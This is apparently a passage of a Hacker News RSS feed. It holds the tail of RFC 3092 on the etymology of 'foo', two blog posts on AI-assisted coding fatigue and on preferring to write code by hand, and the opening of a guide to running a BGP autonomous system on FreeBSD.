   | 3010 |  X  |  X  |         |       | 207 |
   | 3023 |     |  X  |         |       | 208 |
   | 3028 |     |  X  |         |       | 209 |
   | 3075 |  X  |  X  |         |       | 210 |
   | 3080 |     |  X  |         |       | 211 |
   | 3092 |  X  |  X  |    X    |   X   | 212 |
   +------+-----+-----+---------+-------+-----+
   | RFC# | bar | foo | foo.bar | fubar |  #  |
   |      |     |     | foobar  |       |     |
   +------+-----+-----+---------+-------+-----+

Security Considerations

   Security issues are not discussed in this memo.











<span>Eastlake, et al.             Informational                     [Page 11]</span></pre>
<hr><!--NewPage--><pre><span id="page-12"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


References

   [<a id="ref-BFF">BFF</a>]     "Best of Foo Fighters: Signature Licks", Troy Stetina, Foo
             Fighters, October 2000, Hal Leonard Publishing Corporation,
             ISBN 063401470.

   [<a id="ref-DOG">DOG</a>]     &lt;<a href="http://www.rarebreed.com/breeds/foo/foo.html">http://www.rarebreed.com/breeds/foo/foo.html</a>&gt;.


   [<a id="ref-EAC">EAC</a>]     "Encyclopedia of American Comics", Ron Goulart, 1990, Facts
             on File.

   [<a id="ref-EF">EF</a>]      "Encyclopedia Frobozzica",
             &lt;<a href="http://www.everything2.com/index.pl?node=Prince%20Foo">http://www.everything2.com/index.pl?node=Prince%20Foo</a>&gt;

   [<a id="ref-FF">FF</a>]      Foo Fighters - "The Rainbow Conspiracy", Brad Steiger,
             Sherry Hansen Steiger, December 1998, Kensington Publishing
             Corp., ISBN 1575663635.  - Computer UFO Network
             &lt;<a href="http://www.cufon.org/">http://www.cufon.org</a>&gt; particularly
             &lt;<a href="http://www.cufon.org/cufon/foo.htm">http://www.cufon.org/cufon/foo.htm</a>&gt;.

   [<a id="ref-FOLDOC">FOLDOC</a>]  "Free On-Line Dictionary Of Computing",
             &lt;<a href="http://www.foldoc.org/">http://www.foldoc.org</a>&gt;.

   [<a id="ref-JARGON">JARGON</a>]  The Jargon File.  See &lt;<a href="http://www.jargon.org/">http://www.jargon.org</a>&gt;.  Last
             printed as "The New Hacker's Dictionary", Eric S. Raymond,
             3rd Edition, MIT Press, ISBN 0-262-68092-0, 1996.

   [<a id="ref-OED">OED</a>]     "The Oxford English Dictionary", J. A. Simpson, 1989,
             Oxford University Press, ISBN 0198611862.

   [<a id="ref-PERS">PERS</a>]    Personal communications.

   [<a id="ref-RFC269">RFC269</a>]  Brodie, H., "Some Experience with File Transfer", <a href="https://datatracker.ietf.org/doc/html/rfc269">RFC 269</a>,
             December 1971.

   [<a id="ref-RFC1037">RFC1037</a>] Greenberg, B. and S. Keene, "NFILE - A File Access
             Protocol", <a href="https://datatracker.ietf.org/doc/html/rfc1037">RFC 1037</a>, December 1987.

   [<a id="ref-RFC1639">RFC1639</a>] Piscitello, D., "FTP Operation Over Big Address Records
             (FOOBAR)", <a href="https://datatracker.ietf.org/doc/html/rfc1639">RFC 1639</a>, June 1994.

   [<a id="ref-RFC2606">RFC2606</a>] Eastlake, D. and A. Panitz, "Reserved Top Level DNS Names",
             <a href="https://datatracker.ietf.org/doc/html/bcp32">BCP 32</a>, <a href="https://datatracker.ietf.org/doc/html/rfc2606">RFC 2606</a>, June 1999.







<span>Eastlake, et al.             Informational                     [Page 12]</span></pre>
<hr><!--NewPage--><pre><span id="page-13"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


   [<a id="ref-TMRC">TMRC</a>]    The Tech Model Railroad Club (The Model Railroad Club of
             the Massachusetts Institute of Technology) Dictionary,
             &lt;<a href="http://tmrc-www.mit.edu/dictionary.html">http://tmrc-www.mit.edu/dictionary.html</a>&gt;.

   [<a id="ref-WBCC">WBCC</a>]    "Warner Brothers Cartoon Companion",
             &lt;<a href="http://members.aol.com/EOCostello/">http://members.aol.com/EOCostello/</a>&gt;.

   [<a id="ref-WORDS">WORDS</a>]   "Words", Paul Dickson, ISBN 0-440-52260-7, Dell, 1982.

Authors' Addresses

   The authors of this document are:

   Donald E. Eastlake 3rd
   Motorola
   155 Beaver Street
   Milford, MA 01757 USA

   Phone:  +1 508-261-5434 (w)
           +1 508-634-2066 (h)
   Fax:    +1 508-261-4777 (w)
   EMail:  Donald.Eastlake@motorola.com


   Carl-Uno Manros
   Xerox Corporation
   701 Aviation Blvd.
   El Segundo, CA 90245 USA

   Phone:  +1 310-333-8273
   Fax:    +1 310-333-5514
   EMail:  manros@cp10.es.xerox.com


   Eric S. Raymond
   Open Source Initiative
   6 Karen Drive
   Malvern, PA 19355

   Phone:  +1 610-296-5718
   EMail:  esr@thyrsus.com










<span>Eastlake, et al.             Informational                     [Page 13]</span></pre>
<hr><!--NewPage--><pre><span id="page-14"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


Full Copyright Statement

   Copyright (C) The Internet Society (2001).  All Rights Reserved.

   This document and translations of it may be copied and furnished to
   others, and derivative works that comment on or otherwise explain it
   or assist in its implementation may be prepared, copied, published
   and distributed, in whole or in part, without restriction of any
   kind, provided that the above copyright notice and this paragraph are
   included on all such copies and derivative works.  However, this
   document itself may not be modified in any way, such as by removing
   the copyright notice or references to the Internet Society or other
   Internet organizations, except as needed for the purpose of
   developing Internet standards in which case the procedures for
   copyrights defined in the Internet Standards process must be
   followed, or as required to translate it into languages other than
   English.

   The limited permissions granted above are perpetual and will not be
   revoked by the Internet Society or its successors or assigns.

   This document and the information contained herein is provided on an
   "AS IS" basis and THE INTERNET SOCIETY AND THE INTERNET ENGINEERING
   TASK FORCE DISCLAIMS ALL WARRANTIES, EXPRESS OR IMPLIED, INCLUDING
   BUT NOT LIMITED TO ANY WARRANTY THAT THE USE OF THE INFORMATION
   HEREIN WILL NOT INFRINGE ANY RIGHTS OR ANY IMPLIED WARRANTIES OF
   MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE.

Acknowledgement

   Funding for the RFC Editor function is currently provided by the
   Internet Society.



















Eastlake, et al.             Informational                     [Page 14]
</pre></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AI fatigue Is real and nobody talks about it (398 pts)]]></title>
            <link>https://siddhantkhare.com/writing/ai-fatigue-is-real</link>
            <guid>46934404</guid>
            <pubDate>Sun, 08 Feb 2026 14:19:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://siddhantkhare.com/writing/ai-fatigue-is-real">https://siddhantkhare.com/writing/ai-fatigue-is-real</a>, See on <a href="https://news.ycombinator.com/item?id=46934404">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><!----><p>I shipped more code last quarter than any quarter in my career. I also felt more drained than any quarter in my career. These two facts are not unrelated.</p>
<p>I build AI agent infrastructure for a living. I'm one of the core maintainers of <a href="https://openfga.dev/">OpenFGA</a> (CNCF Incubating), I built <a href="https://github.com/Siddhant-K-code/agentic-authz">agentic-authz</a> for agent authorization, I built <a href="https://distill.siddhantkhare.com/">Distill</a> for context deduplication, I shipped MCP servers. I'm not someone who dabbles with AI on the side. I'm deep in it. I build the tools that other engineers use to make AI agents work in production.</p>
<p>And yet, I hit a wall. The kind of exhaustion that no amount of tooling or workflow optimization could fix.</p>
<p>If you're an engineer who uses AI daily - for design reviews, code generation, debugging, documentation, architecture decisions - and you've noticed that you're somehow more tired than before AI existed, this post is for you. You're not imagining it. You're not weak. You're experiencing something real that the industry is aggressively pretending doesn't exist. And if someone who builds agent infrastructure full-time can burn out on AI, it can happen to anyone.</p>
<p>I want to talk about it honestly. Not the "AI is amazing and here's my workflow" version. The real version. The one where you stare at your screen at 11pm, surrounded by AI-generated code you still need to review, wondering why the tool that was supposed to save you time has consumed your entire day.</p>
<p><img src="https://siddhantkhare.com/blog/ai-fatigue-is-real/1.png" alt="An overwhelmed engineer surrounded by code, errors, and notifications"></p>
<h2>The paradox nobody warned us about</h2>
<p>Here's the thing that broke my brain for a while: AI genuinely makes individual tasks faster. That's not a lie. What used to take me 3 hours now takes 45 minutes. Drafting a design doc, scaffolding a new service, writing test cases, researching an unfamiliar API. All faster.</p>
<p>But my days got harder. Not easier. Harder.</p>
<p>The reason is simple once you see it, but it took me months to figure out. When each task takes less time, you don't do fewer tasks. You do more tasks. Your capacity appears to expand, so the work expands to fill it. And then some. Your manager sees you shipping faster, so the expectations adjust. You see yourself shipping faster, so your own expectations adjust. The baseline moves.</p>
<p>Before AI, I might spend a full day on one design problem. I'd sketch on paper, think in the shower, go for a walk, come back with clarity. The pace was slow but the cognitive load was manageable. One problem. One day. Deep focus.</p>
<p>Now? I might touch six different problems in a day. Each one "only takes an hour with AI." But context-switching between six problems is brutally expensive for the human brain. The AI doesn't get tired between problems. I do.</p>
<p>This is the paradox: <strong>AI reduces the cost of production but increases the cost of coordination, review, and decision-making. And those costs fall entirely on the human.</strong></p>
<h2>You became a reviewer and you didn't sign up for it</h2>
<p><img src="https://siddhantkhare.com/blog/ai-fatigue-is-real/3.png" alt="AI dropping code onto a conveyor belt faster than a human can review"></p>
<p>Before AI, my job was: think about a problem, write code, test it, ship it. I was the creator. The maker. That's what drew most of us to engineering in the first place - the act of building.</p>
<p>After AI, my job increasingly became: prompt, wait, read output, evaluate output, decide if output is correct, decide if output is safe, decide if output matches the architecture, fix the parts that don't, re-prompt, repeat. I became a reviewer. A judge. A quality inspector on an assembly line that never stops.</p>
<p>This is a fundamentally different kind of work. Creating is energizing. Reviewing is draining. There's research on this - the psychological difference between generative tasks and evaluative tasks. Generative work gives you flow states. Evaluative work gives you decision fatigue.</p>
<p>I noticed it first during a week where I was using AI heavily for a new microservice. By Wednesday, I couldn't make simple decisions anymore. What should this function be named? I didn't care. Where should this config live? I didn't care. My brain was full. Not from writing code - from judging code. Hundreds of small judgments, all day, every day.</p>
<p>The cruel irony is that AI-generated code requires more careful review than human-written code. When a colleague writes code, I know their patterns, their strengths, their blind spots. I can skim the parts I trust and focus on the parts I don't. With AI, every line is suspect. The code looks confident. It compiles. It might even pass tests. But it could be subtly wrong in ways that only surface in production, under load, at 3am.</p>
<p>So you read every line. And reading code you didn't write, that was generated by a system that doesn't understand your codebase's history or your team's conventions, is exhausting work.</p>
<p>This is also why I think agent security and authorization matter so much. If we can't review everything AI produces - and we can't, not at scale - then we need systems that constrain what agents can do in the first place. Least-privilege access, scoped tokens, audit trails. The less you have to worry about "did the AI do something dangerous," the more cognitive budget you have for the work that actually matters. This isn't just a security problem. It's a human sustainability problem.</p>
<h2>The nondeterminism problem</h2>
<p>Engineers are trained on determinism. Same input, same output. That's the contract. That's what makes debugging possible. That's what makes reasoning about systems possible.</p>
<p>AI broke that contract.</p>
<p><img src="https://siddhantkhare.com/blog/ai-fatigue-is-real/4.png" alt="Same prompt, same AI, different results - clean code or spaghetti"></p>
<p>I had a prompt that worked perfectly on Monday. Generated clean, well-structured code for an API endpoint. I used the same prompt on Tuesday for a similar endpoint. The output was structurally different, used a different error handling pattern, and introduced a dependency I didn't ask for.</p>
<p>Why? No reason. Or rather, no reason I can access. There's no stack trace for "the model decided to go a different direction today." There's no log that says "temperature sampling chose path B instead of path A." It just... happened differently.</p>
<p>For someone whose entire career is built on "if it broke, I can find out why," this is deeply unsettling. Not in a dramatic way. In a slow, grinding, background-anxiety way. You can never fully trust the output. You can never fully relax. Every interaction requires vigilance.</p>
<p>I tried to fight this. I version-controlled my prompts. I built elaborate system messages. I created templates. Some of it helped. None of it solved the fundamental problem: <strong>you are collaborating with a probabilistic system, and your brain is wired for deterministic ones.</strong> That mismatch is a constant, low-grade source of stress.</p>
<p>This frustration is actually what led me to build <a href="https://distill.siddhantkhare.com/">Distill</a> - deterministic context deduplication for LLMs. No LLM calls, no embeddings, no probabilistic heuristics. Pure algorithms that clean your context in ~12ms. I wanted at least one part of the AI pipeline to be something I could reason about, debug, and trust. If the model's output is going to be nondeterministic, the least I can do is make sure the input is clean and predictable.</p>
<p>The engineers I've talked to who handle this best are the ones who've made peace with it. They treat AI output like a first draft from a smart but unreliable intern. They expect to rewrite 30% of it. They budget time for that rewriting. They don't get frustrated when the output is wrong because they never expected it to be right. They expected it to be useful. There's a difference.</p>
<h2>The FOMO treadmill</h2>
<p>Take a breath and try to keep up with just the last few months. Claude Code ships sub-agents, then skills, then an Agent SDK, then Claude Cowork. OpenAI launches Codex CLI, then GPT-5.3-Codex - a model that literally helped code itself. New coding agents announce background mode with hundreds of concurrent autonomous sessions. Google drops Gemini CLI. GitHub adds an MCP Registry. Acquisitions happen weekly. Amazon Q Developer gets agentic upgrades. CrewAI, AutoGen, LangGraph, MetaGPT - pick your agent framework, there's a new one every week. Google announces A2A (Agent-to-Agent protocol) to compete with Anthropic's MCP. OpenAI ships its own Swarm framework. Kimi K2.5 drops with agent swarm architecture orchestrating 100 parallel agents. "Vibe coding" becomes a thing. OpenClaw launches a skills marketplace and within one week, researchers find 400+ malicious agent skills uploaded to ClawHub. And somewhere in the middle of all this, someone on LinkedIn posts "if you're not using AI agents with sub-agent orchestration in 2026, you're already obsolete."</p>
<p>That's not a year. That's a few months. And I'm leaving stuff out.</p>
<p>I fell into this trap hard. I was spending weekends evaluating new tools. Reading every changelog. Watching every demo. Trying to stay at the frontier because I was terrified of falling behind.</p>
<p>Here's what that actually looked like: I'd spend Saturday afternoon setting up a new AI coding tool. By Sunday I'd have a basic workflow. By the following Wednesday, someone would post about a different tool that was "way better." I'd feel a pang of anxiety. By the next weekend, I'd be setting up the new thing. The old thing would sit unused. One coding assistant to the next to the next and back to the first one. Each migration cost me a weekend and gave me maybe a 5% improvement that I couldn't even measure properly.</p>
<p>Multiply this by every category - coding assistants, chat interfaces, agent frameworks, multi-agent orchestration platforms, MCP servers, context management tools, prompt libraries, swarm architectures, skills marketplaces - and you get a person who is perpetually learning new tools and never getting deep with any of them. The Hacker News front page alone is enough to give you whiplash. One day it's "Show HN: Autonomous Research Swarm" and the next it's "Ask HN: How will AI swarms coordinate?" Nobody knows. Everyone's building anyway.</p>
<p>The worst part is the knowledge decay. I spent two weeks building a sophisticated prompt engineering workflow in early 2025. Carefully crafted system prompts, few-shot examples, chain-of-thought templates. It worked well. Three months later, the model updated, the prompting best practices shifted, and half my templates produced worse results than a simple one-liner. Those two weeks were gone. Not invested. Spent. The same thing happened with my MCP server setup - I built five custom servers (Dev.to publisher, Apple Notes integration, Python and TypeScript sandboxes, more), then the protocol evolved, then the MCP Registry launched on GitHub and suddenly there were thousands of pre-built ones. Some of my custom work became redundant overnight.</p>
<p>The agent framework churn is even worse. I watched teams go from LangChain to CrewAI to AutoGen to custom orchestration in the span of a year. Each migration meant rewriting integrations, relearning APIs, rebuilding workflows. The people who waited and did nothing often ended up in a better position than the people who adopted early and had to migrate twice.</p>
<p>I've since adopted a different approach. Instead of chasing every new tool, I go deep on the infrastructure layer underneath them. Tools come and go. The problems they solve don't. Context efficiency, agent authorization, audit trails, runtime security - these are durable problems regardless of which framework is trending this month. That's why I built <a href="https://github.com/Siddhant-K-code/agentic-authz">agentic-authz</a> on OpenFGA instead of tying it to any specific agent framework. That's why Distill works at the context level, not the prompt level. Build on the layer that doesn't churn.</p>
<p>I still track the landscape closely - you have to when you're building infrastructure for it. But I track it to understand where the ecosystem is going, not to adopt every new thing. There's a difference between being informed and being reactive.</p>
<h2>The "just one more prompt" trap</h2>
<p>This one is insidious. You're trying to get AI to generate something specific. The first output is 70% right. So you refine your prompt. The second output is 75% right but broke something the first one had correct. Third attempt: 80% right but now the structure is different. Fourth attempt: you've been at this for 45 minutes and you could have written the thing from scratch in 20.</p>
<p>I call this the prompt spiral. It's the AI equivalent of yak shaving. You started with a clear goal. Thirty minutes later you're debugging your prompt instead of debugging your code. You're optimizing your instructions to a language model instead of solving the actual problem.</p>
<p>The prompt spiral is especially dangerous because it feels productive. You're iterating. You're getting closer. Each attempt is slightly better. But the marginal returns are diminishing fast, and you've lost sight of the fact that the goal was never "get the AI to produce perfect output." The goal was to ship the feature.</p>
<p>I now have a hard rule: three attempts. If the AI doesn't get me to 70% usable in three prompts, I write it myself. No exceptions. This single rule has saved me more time than any prompting technique I've ever learned.</p>
<h2>Perfectionism meets probabilistic output</h2>
<p>Engineers tend toward perfectionism. We like clean code. We like tests that pass. We like systems that behave predictably. This is a feature, not a bug - it's what makes us good at building reliable software.</p>
<p>AI output is never perfect. It's always "pretty good." 70-80% there. The variable names are slightly off. The error handling is incomplete. The edge cases are ignored. The abstraction is wrong for your codebase. It works, but it's not right.</p>
<p>For a perfectionist, this is torture. Because "almost right" is worse than "completely wrong." Completely wrong, you throw away and start over. Almost right, you spend an hour tweaking. And tweaking AI output is uniquely frustrating because you're fixing someone else's design decisions - decisions that were made by a system that doesn't share your taste, your context, or your standards.</p>
<p>I had to learn to let go. Not of quality - I still care about quality. But of the expectation that AI would produce quality. I now treat every AI output as a rough draft. A starting point. Raw material. I mentally label it "draft" the moment it appears, and that framing change alone reduced my frustration by half.</p>
<p>The engineers who struggle most with AI are often the best engineers. The ones with the highest standards. The ones who notice every imperfection. AI rewards a different skill: the ability to extract value from imperfect output quickly, without getting emotionally invested in making it perfect.</p>
<h2>The thinking atrophy</h2>
<p><img src="https://siddhantkhare.com/blog/ai-fatigue-is-real/5.png" alt="A brain on a couch watching AI, its thinking muscles covered in cobwebs"></p>
<p>This is the one that scares me most.</p>
<p>I noticed it during a design review meeting. Someone asked me to reason through a concurrency problem on the whiteboard. No laptop. No AI. Just me and a marker. And I struggled. Not because I didn't know the concepts - I did. But because I hadn't exercised that muscle in months. I'd been outsourcing my first-draft thinking to AI for so long that my ability to think from scratch had degraded.</p>
<p>It's like GPS and navigation. Before GPS, you built mental maps. You knew your city. You could reason about routes. After years of GPS, you can't navigate without it. The skill atrophied because you stopped using it.</p>
<p>The same thing is happening with AI and engineering thinking. When you always ask AI first, you stop building the neural pathways that come from struggling with a problem yourself. The struggle is where learning happens. The confusion is where understanding forms. Skip that, and you get faster output but shallower understanding.</p>
<p>I now deliberately spend the first hour of my day without AI. I think on paper. I sketch architectures by hand. I reason through problems the slow way. It feels inefficient. It is inefficient. But it keeps my thinking sharp, and that sharpness pays dividends for the rest of the day when I do use AI - because I can evaluate its output better when my own reasoning is warmed up.</p>
<h2>The comparison trap</h2>
<p>Social media is full of people who seem to have AI figured out. They post their workflows. Their productivity numbers. Their "I built this entire app in 2 hours with AI" threads. And you look at your own experience - the failed prompts, the wasted time, the code you had to rewrite - and you think: what's wrong with me?</p>
<p>Nothing is wrong with you. Those threads are highlight reels. Nobody posts "I spent 3 hours trying to get Claude to understand my database schema and eventually gave up and wrote the migration by hand." Nobody posts "AI-generated code caused a production incident because it silently swallowed an error." Nobody posts "I'm tired."</p>
<p>The comparison trap is amplified by the fact that AI skill is hard to measure. With traditional engineering, you can look at someone's code and roughly gauge their ability. With AI, the output depends on the model, the prompt, the context, the temperature, the phase of the moon. Someone's impressive demo might not reproduce on your machine with your codebase.</p>
<p>I became much more selective about AI content on social media. I still follow the space closely - I have to, it's my job. But I shifted from consuming everyone's hot takes to focusing on people who are actually building and shipping, not just demoing. The ratio of signal to anxiety matters. If a feed is making you feel behind instead of informed, it's not serving you.</p>
<h2>What actually helped</h2>
<p>I'll be specific about what changed my relationship with AI from adversarial to sustainable.</p>
<p><strong>Time-boxing AI sessions.</strong> I don't use AI in an open-ended way anymore. I set a timer. 30 minutes for this task with AI. When the timer goes off, I ship what I have or switch to writing it myself. This prevents the prompt spiral and the perfectionism trap simultaneously.</p>
<p><strong>Separating AI time from thinking time.</strong> Morning is for thinking. Afternoon is for AI-assisted execution. This isn't rigid - sometimes I break the rule. But having a default structure means my brain gets both exercise and assistance in the right proportions.</p>
<p><strong>Accepting 70% from AI.</strong> I stopped trying to get perfect output. 70% usable is the bar. I'll fix the rest myself. This acceptance was the single biggest reducer of AI-related frustration in my workflow.</p>
<p><strong>Being strategic about the hype cycle.</strong> I track the AI landscape because I build infrastructure for it. But I stopped adopting every new tool the week it launches. I use one primary coding assistant and know it deeply. I evaluate new tools when they've proven themselves over months, not days. Staying informed and staying reactive are different things.</p>
<p><strong>Logging where AI helps and where it doesn't.</strong> I kept a simple log for two weeks: task, used AI (yes/no), time spent, satisfaction with result. The data was revealing. AI saved me significant time on boilerplate, documentation, and test generation. It cost me time on architecture decisions, complex debugging, and anything requiring deep context about my codebase. Now I know when to reach for it and when not to.</p>
<p><strong>Not reviewing everything AI produces.</strong> This was hard to accept. But if you're using AI to generate large amounts of code, you physically cannot review every line with the same rigor. I focus my review energy on the parts that matter most - security boundaries, data handling, error paths - and rely on automated tests and static analysis for the rest. Some roughness in non-critical code is acceptable.</p>
<h2>The sustainability question</h2>
<p>The tech industry has a burnout problem that predates AI. AI is making it worse, not better. Not because AI is bad, but because AI removes the natural speed limits that used to protect us.</p>
<p>Before AI, there was a ceiling on how much you could produce in a day. That ceiling was set by typing speed, thinking speed, the time it takes to look things up. It was frustrating sometimes, but it was also a governor. You couldn't work yourself to death because the work itself imposed limits.</p>
<p>AI removed the governor. Now the only limit is your cognitive endurance. And most people don't know their cognitive limits until they've blown past them.</p>
<p>I burned out in late 2025. Not dramatically - I didn't quit or have a breakdown. I just stopped caring. Code reviews became rubber stamps. Design decisions became "whatever AI suggests." I was going through the motions, producing more than ever, feeling less than ever. It took me a month to realize what had happened and another month to recover.</p>
<p>The recovery wasn't about using less AI. It was about using AI differently. With boundaries. With intention. With the understanding that I am not a machine and I don't need to keep pace with one. Working at <a href="https://ona.com/">Ona</a> helped me see this clearly - when you're building AI agent infrastructure for enterprise customers, you see the human cost of unsustainable AI workflows at scale. The problems aren't just personal. They're systemic. And they need to be solved at the tooling level, not just the individual level.</p>
<p>Ironically, the burnout period is when some of my best work happened. When I stopped trying to use every AI tool and started thinking about what was actually broken, I saw the problems clearly for the first time. Context windows filling up with garbage - that became Distill. Agents with all-or-nothing API key access - that became agentic-authz. The inability to audit what an agent actually did - that's becoming AgentTrace. The fatigue forced me to stop consuming and start building. Not building more features faster, but building the right things deliberately.</p>
<h2>The real skill</h2>
<p>Here's what I think the real skill of the AI era is. It's not prompt engineering. It's not knowing which model to use. It's not having the perfect workflow.</p>
<p>It's knowing when to stop.</p>
<p><img src="https://siddhantkhare.com/blog/ai-fatigue-is-real/6.png" alt="A hand pulling the STOP switch - good enough, ship it, go outside, rest"></p>
<p>Knowing when the AI output is good enough. Knowing when to write it yourself. Knowing when to close the laptop. Knowing when the marginal improvement isn't worth the cognitive cost. Knowing that your brain is a finite resource and that protecting it is not laziness - it's engineering.</p>
<p>We optimize our systems for sustainability. We add circuit breakers. We implement backpressure. We design for graceful degradation. We should do the same for ourselves.</p>
<p>AI is the most powerful tool I've ever used. It's also the most draining. Both things are true. The engineers who thrive in this era won't be the ones who use AI the most. They'll be the ones who use it the most wisely.</p>
<p>If you're tired, it's not because you're doing it wrong. It's because this is genuinely hard. The tool is new, the patterns are still forming, and the industry is pretending that more output equals more value. It doesn't. Sustainable output does.</p>
<p>I'm still building in this space every day. Agent authorization, context engineering, audit trails, runtime security - the infrastructure that makes AI agents actually work in production. I'm more committed to AI than ever. But I'm committed on my terms, at my pace, building things that matter instead of chasing things that trend.</p>
<p>Take care of your brain. It's the only one you've got, and no AI can replace it.</p>
<hr>
<p><em>I write about AI agent infrastructure, security, context engineering, and the human side of building with AI. You can find all my writing on my <a href="https://siddhantkhare.com/writing">writing page</a>.</em></p>
<!----></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I am happier writing code by hand (358 pts)]]></title>
            <link>https://www.abhinavomprakash.com/posts/i-am-happier-writing-code-by-hand/</link>
            <guid>46934344</guid>
            <pubDate>Sun, 08 Feb 2026 14:12:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.abhinavomprakash.com/posts/i-am-happier-writing-code-by-hand/">https://www.abhinavomprakash.com/posts/i-am-happier-writing-code-by-hand/</a>, See on <a href="https://news.ycombinator.com/item?id=46934344">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div><p>I felt the familiar feeling of depression and lethargy creep in while my eyes darted from watching claude-code work
and my phone. “What’s the point of it all?” I thought, LLMs can generate decent-ish and correct-ish looking code
while I have more time to do what? doomscroll? This was the third time I gave claude-code a try. I felt the same
feelings every single time and ended up deleting claude-code after 2-3 weeks, and whaddyouknow? Every. Single. Time.
I rediscovered the joy of coding.</p><p>Yes, coding is not software engineering, but for me, it is a fun and essential part of it.
In order to be effective at software engineering, you must be familiar with the problem space, and this requires
thinking and wrestling with the problem. You can’t truly know the pain of using an API by just reading its documentation or implementation.
You have to use it to experience it.
The act of writing code, despite being slower, was a way for me to wrestle with the problem space, a way for me to find out that my initial ideas didn’t work, a way for thinking.
Vibe coding interfered with that.</p><blockquote><p>If you’re thinking without writing, you only think you’re thinking.</p><p>– Leslie Lamport</p></blockquote><p>The other major part of the job is to ensure correctness. For me, it is much harder to verify the correctness of code
I didn’t write compared to code I wrote. The process of writing code helps internalize the context and is
easier for my brain to think deeply about it. If I outsource this to an LLM, I skip over the process of internalizing
the problem domain and I can’t be certain that the generated code is correct.</p><p>By design, vibe coding has an addictive nature to it, you write some instructions, and code that <em>looks</em> correct is generated.
Bam! Dopamine hit! If the code isn’t correct, then it’s just one prompt away from being correct,
right? <em>right?</em></p><p>Vibe coding also has the profound effect of turning my brain off and passively accepting changes.
When it is time to use my brain, the inertia is much harder to overcome and it is easy to choose the lazy way out.
At my lowest point, I even asked it to do a find-and-replace in a file. Something that takes a few seconds, now took
minutes and a network call.</p><p>Even if I generate a 1,000 line PR in 30 minutes I still need to understand and review it.
Since I am responsible for the code I ship, this makes me the bottleneck.</p><p>The common view of vibe coding is that it is neither good nor bad, it is a tool. But tools shape your workflow and
your thought process, and if a tool prevents you from thinking deeply, I don’t think it is a good tool.
If you are a knowledge worker, your core competency is your ability to think, and if a tool interferes with that, be
afraid, be very afraid.</p><p>Now, I would be lying if I said I didn’t use LLMs to generate code. I still use Claude, but I do so in a more
controlled manner. I copy-paste files that I think are necessary to provide the context, and then I copy-paste code and
ask it to make changes to it or write tests for it. This friction has several benefits. I can’t make changes that span
multiple files, this means the generated diff isn’t too large, and if I have to manually change other files I know how
the code fits in. Manually giving claude the context forces me to be familiar with the codebase myself, rather than tell
it to just “cook”. It turns code generation from a passive action to a deliberate <em>thoughtful</em> action.
It also keeps my brain engaged and active, which means I can still enter the <a href="https://en.wikipedia.org/wiki/Flow_(psychology)">flow state</a>.
I have found this to be the best of both worlds and a way to preserve my happiness at work.</p><p>Ultimately, life is too short to not optimize for happiness. <strong>Maybe</strong> (a big maybe) generating entire features would make me more
productive, but if it causes existential dread and makes me depressed, I don’t see it being productive in the long
run. Maybe you relate to some of the feelings. Maybe you don’t. But don’t be afraid to choose differently.</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Running Your Own As: BGP on FreeBSD with FRR, GRE Tunnels, and Policy Routing (147 pts)]]></title>
            <link>https://blog.hofstede.it/running-your-own-as-bgp-on-freebsd-with-frr-gre-tunnels-and-policy-routing/</link>
            <guid>46934266</guid>
            <pubDate>Sun, 08 Feb 2026 14:02:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.hofstede.it/running-your-own-as-bgp-on-freebsd-with-frr-gre-tunnels-and-policy-routing/">https://blog.hofstede.it/running-your-own-as-bgp-on-freebsd-with-frr-gre-tunnels-and-policy-routing/</a>, See on <a href="https://news.ycombinator.com/item?id=46934266">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <hr>
<p><img alt="Logo" src="https://blog.hofstede.it/images/2026-02-08-running-your-own-as-bgp-freebsd.png" title="Running Your Own AS: Header image"></p>
<p>Running your own Autonomous System on the public internet sounds like something reserved for ISPs and large enterprises. It’s not. With sponsoring LIRs making <span>AS</span> numbers and IPv6 prefixes accessible to individuals, and FreeBSD providing the routing tools to make it work, you can announce your own address space to the Default-Free Zone from a single virtual&nbsp;machine.</p>
<p>This article walks through the complete setup: obtaining resources from <span>RIPE</span> via a sponsoring <span>LIR</span>, configuring a FreeBSD <span>BGP</span> router with <span>FRR</span>, building <span>GRE</span>/<span>GIF</span> tunnels to distribute prefixes to remote servers, and solving the routing challenge that arises when a server needs to speak from two different IPv6 address spaces&nbsp;simultaneously.</p>
<blockquote>
<p><strong>Note on addresses:</strong> All provider-assigned <span>IP</span> addresses, hostnames, and management IPs in this article have been replaced with <a href="https://www.rfc-editor.org/rfc/rfc5737"><span>RFC</span> 5737</a> / <a href="https://www.rfc-editor.org/rfc/rfc3849"><span>RFC</span> 3849</a> documentation ranges. My own <span>AS</span> number (<span>AS201379</span>) and prefix (2a06:9801:1c::/48) are public <span>BGP</span> resources and shown as-is. The upstream <span>AS</span> numbers (<span>AS34927</span>, <span>AS209735</span>) are equally visible in public routing&nbsp;tables.</p>
</blockquote>
<h2>Why Run Your Own <span>AS</span>?</h2>
<p>Provider-assigned IPv6 addresses are tied to that provider. Move to a different hoster and your addresses change - along with <span>DNS</span> records, firewall rules, reputation, and every system that references them. With your own <span>AS</span> and prefix, your addresses follow you. Migrate a server, update a tunnel endpoint, and traffic flows again without touching a single service&nbsp;configuration.</p>
<p>There are also less practical reasons. Understanding <span>BGP</span> transforms how you think about internet routing. Watching your prefix propagate through the <span>DFZ</span> and appear on looking glasses worldwide is genuinely satisfying. And if you run services across multiple providers, having provider-independent addressing simplifies the architecture&nbsp;considerably.</p>
<h2>Obtaining&nbsp;Resources</h2>
<p>To announce prefixes on the internet, you need two things from a Regional Internet Registry (in Europe, that’s <span>RIPE</span> <span>NCC</span>):</p>
<ol>
<li><strong>An <span>AS</span> number</strong> - your identity in <span>BGP</span>. Mine is <span>AS201379</span>.</li>
